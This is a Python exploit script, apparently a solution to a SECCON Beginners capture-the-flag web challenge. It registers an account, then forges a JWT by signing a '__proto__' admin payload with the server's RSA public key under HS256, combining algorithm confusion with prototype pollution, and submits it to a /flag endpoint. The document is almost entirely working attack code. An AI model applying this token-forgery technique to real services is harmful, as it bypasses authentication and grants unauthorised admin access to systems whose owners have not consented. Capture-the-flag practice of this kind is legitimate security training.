import os
import json
import sys
import requests
import jwt
import textwrap

def solve(url):
    # /register
    register_data = {
        "username": "alice",
        "password": "password"
    }

    s = requests.Session()

    register_response = s.post(f'{url}/register', json=register_data)

    if register_response.status_code != 200:
        print(f"Register request failed: {register_response.status_code}, {register_response.text}")
        sys.exit()

    # /flag
    payload = {
        "__proto__": {
            "admin": True
        }
    }

    pubkey = textwrap.dedent('''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3NcjHBbKAAhJd6P+TviV
h/WRXtxtKBJLPQYIlmZ/I35WlQLpNXR9Q0YiQLMNW0E3MTHISQlQE5hBF8S2Z2tC
0SmiAMr3QQjaIA3vmefA/CXSp4YjIbKz75Nwzczk7spYiVwEbYoLOpovnl+KB6Tj
XJWCFXvgpL6xYu9Se8msgqVIl+cWANlmPdBuDRvF/7KUboHsdZsn1mL88JoTnk9u
sVp9PP+bpbcFEzwzfS+YkjwUhXFHHNPqsu9eKZZlpkRbl3lZzzxgX4G/bh3BkaCO
wp4Pv1ptk8NJH8N96USDw3Lpgc6wGReoyCBY7Dtg1a3IHNjQQwQg+rd+1yUUfPAe
qa9MbLWr3hYQn+9G4SxTwmWptGJLLjZMzfELtGxiZTHlnifP4nHSNJ8WdGJ63YU9
7LiwkWsE8BVIPi+f/oNIbhhgJzGSD57mkdN0wNloN0I+83/0g2TnVSvkSM5ow/E9
h2w/qaT9LfjtYiZbFFc95lwcaR1nUO/hmZ2okTt7Nh5tlefbvHNSyHMFuvTiEanI
xO2kJIXugy9h9pNAX8jlNHNQWT1WM5HI3t8aMcsucjOT9wTWh7Hl0qxrO4f7f2kP
HODGSRQ/uR9czPYtXP4HPAPUToZ9Xzc5Voj3Q/bzRcAnkKH6fmUOtLPd2XhTDTFl
A5kHBxj92CnlYq6/bQdXDy0CAwEAAQ==
-----END PUBLIC KEY-----
    ''')

    forged_jwt = jwt.encode(payload, pubkey, algorithm="HS256")

    headers = {
        "Authorization": forged_jwt.decode(),
        "Content-Type": "application/json"
    }

    flag_response = s.post(f'{url}/flag', headers=headers)

    if flag_response.status_code != 200:
        print(f"Get flag request failed: {flag_response.status_code}, {flag_response.text}")
        sys.exit()

    return flag_response.text

if __name__ == "__main__":
    flag = solve("https://double-check.beginners.seccon.games")
    print(flag)